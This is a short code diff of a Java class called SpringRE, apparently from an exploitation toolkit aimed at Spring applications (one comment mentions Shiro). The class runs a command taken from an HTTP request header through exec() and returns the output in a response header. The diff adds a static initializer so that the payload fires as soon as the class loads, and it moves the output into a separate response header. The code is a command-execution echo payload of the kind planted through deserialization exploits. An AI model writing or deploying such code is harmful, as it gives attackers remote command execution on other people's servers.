@@ -19,6 +19,10 @@ import java.lang.reflect.Method;
 @JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.RHEADER})
 public class SpringRE {
     public static String HEADER;
+    public static String RHEADER;
+    static {
+        new SpringRE();
+    }
 
     public SpringRE() {
         try {
@@ -31,7 +35,7 @@ public class SpringRE {
             if (header != null && !header.isEmpty()) {
                 String result = exec(header);
                 // 输出到头
-                invokeMethod(response, "setHeader", new Class[]{String.class, String.class}, new Object[]{HEADER, result});
+                invokeMethod(response, "setHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
 
 //                invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
 //                // 有 shiro 情况不一样了
